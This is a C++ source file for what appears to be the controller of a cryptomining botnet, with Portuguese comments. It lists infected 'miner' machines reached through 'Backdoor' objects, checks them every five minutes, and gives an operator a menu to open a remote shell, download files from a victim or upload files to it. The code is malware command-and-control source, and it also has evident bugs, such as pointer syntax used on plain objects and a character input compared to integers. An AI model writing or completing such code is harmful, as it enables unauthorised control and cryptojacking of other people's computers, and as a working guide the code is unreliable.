#include <iostream>
#include<pthread.h>
#include<thread>
#include "communication.h"
#include "backdoor.h"
#define IP "127.0.0.1"
#define PORT 8000


class Server{
public:

    /*
        This function will check what miners are online and how many are working
    */
    void check_miners(){
        while(true){
            for (Backdoor b : this->backdoors){
                b.get_miner_info();
            }
            sleep(300); // sleep for 5 min
        }
    }

    void operate(){
        int i = 0;
        std::cout << "Choose Miner: " << std::endl;
        for (Backdoor b : backdoors){

            std::cout << i << " - " << b.get_miner_id() << " - ";
            std::cout << b.get_miner_ip() << std::endl;
        }
        int choice = std::cin.get();
        Backdoor nova = backdoors[choice];

        while(true){
            int choice;
            system("cls");
            std::cout << "MINER_ID = " << nova->get_miner_id() << " - IP = \n" << nova->get_miner_ip() << std::endl;

            std::cout << "Operações : " << std::endl;

            std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;

            choice = std::cin.get();


            if(choice == 1){
                nova->c->send_message(nova->get_sock(), "1");
                nova->shell();
            
            }else if(choice == 2){
                std::string path;
                std::cout << "Path: ";
                std::getline(std::cin, path);
                // Get path
                nova->c->send_message(nova->sock, "2");
                nova->download(path.c_str());

            }else if(choice == 3){
                std::string path;
                std::cout << "Path: ";
                std::getline(std::cin, path);
                FILE *f = fopen(path.c_str(), "rb");
                if(f != NULL){
                    nova->c->send_message(nova->sock, "3");
                    nova->upload(path.c_str());
                    fclose(f);
                }else{
                    Error::log_error("Arquivo inexistente na sua maquina.");
                }

            }else if(choice == 4){
                return;
            
            }else{
                Error::log_error("Comando inválido");
            }
        }

    }
    
    
    Server(Communication *c){
        this->c = c;
        backdoors = this->c->get_backdoors();
        std::thread check_minining(check_miners);
        check_minining.join();
    }

private:
    Communication *c;
    std::vector<Backdoor>backdoors;
};



int main(int argc, char *argv[]){

    Communication *c = new Communication(IP, PORT);
    Server *s = new Server(c);

    s->operate();
    
}